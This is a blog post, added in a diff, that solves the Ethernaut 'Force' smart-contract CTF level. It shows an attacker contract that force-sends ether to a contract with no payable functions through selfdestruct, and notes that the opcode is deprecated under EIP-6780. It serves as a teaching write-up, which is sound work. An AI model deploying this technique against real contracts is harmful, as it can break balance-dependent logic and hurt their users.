@@ -1,0 +1,51 @@
+---
+title: Ethernaut - Force - Solution
+date: '2024-05-06'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Force CTF
+---
+
+# Ethernaut - Force - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force { /*
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+    /~____  =ø= /
+    (______)__m_m)
+                   */ }
+```
+
+## Exploit
+
+To solve this level, we need to exploit the fact that `selfdestruct` allows to force-send ether to a contract, even if this contract does not have any payable functions.
+More precisely, we can simply deploy the following attacker contract and send an arbitrary amount of ether (e.g., 1 wei) to that attacker contract.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ForceAttacker {
+    address public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = victim;
+    }
+
+    receive() external payable {
+        selfdestruct(payable(VICTIM));
+    }
+}
+```
+
+Note, however, that this exploit will likely no longer work in the future due to the deprecation of `selfdestruct`.
+
+At the time of writing this post, you will get the following warning when using the above attacker contract in Remix:
+_Warning: "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode._
